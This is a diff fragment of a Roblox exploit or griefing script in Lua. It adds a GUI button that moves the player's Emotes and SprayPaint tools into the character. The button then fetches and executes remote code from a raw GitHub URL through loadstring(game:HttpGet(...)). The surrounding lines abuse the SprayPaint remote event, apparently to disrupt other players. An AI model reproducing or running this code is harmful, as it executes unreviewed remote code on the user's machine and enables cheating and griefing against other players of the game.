@@ -104,6 +104,22 @@ game:GetService("Players").LocalPlayer.Character.SprayPaint.Remote:FireServer(un
 
 end)
 
+Section:NewButton("Tsunami (Spray need)", "ButtonInfo", function()
+for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        if v.name == "Emotes" then
+            v.Parent = game.Players.LocalPlayer.Character
+    end
+end
+
+for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        if v.name == "SprayPaint" then
+            v.Parent = game.Players.LocalPlayer.Character
+    end
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tontov/zxcttt/main/tttttt", true))()
+end)
+
 Section:NewButton("Blur (Spray need)", "ButtonInfo", function()
 local args = {
     [1] = "SprayPaint"
